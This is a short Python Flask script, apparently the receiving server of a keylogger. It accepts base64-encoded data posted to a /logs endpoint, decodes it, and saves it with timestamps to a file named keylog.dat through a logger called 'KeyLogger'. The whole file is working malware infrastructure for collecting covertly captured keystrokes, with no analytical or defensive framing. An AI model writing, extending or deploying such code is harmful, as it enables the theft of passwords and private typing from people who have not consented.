#!/usr/bin/python
import base64
import logging
from flask import Flask, request

app = Flask('catcher')


@app.route('/logs',methods=['POST'])
def logs():
    logger = logging.getLogger('KeyLogger')
    cmd = base64.b64decode(request.form.get('cmd', '')).strip()
    logger.warn(cmd)
    return ''

if __name__ == '__main__':
    logger = logging.getLogger('KeyLogger')
    logger.setLevel(logging.INFO)
    handler = logging.FileHandler('keylog.dat')
    handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
    logger.addHandler(handler)
    app.run(port=80)
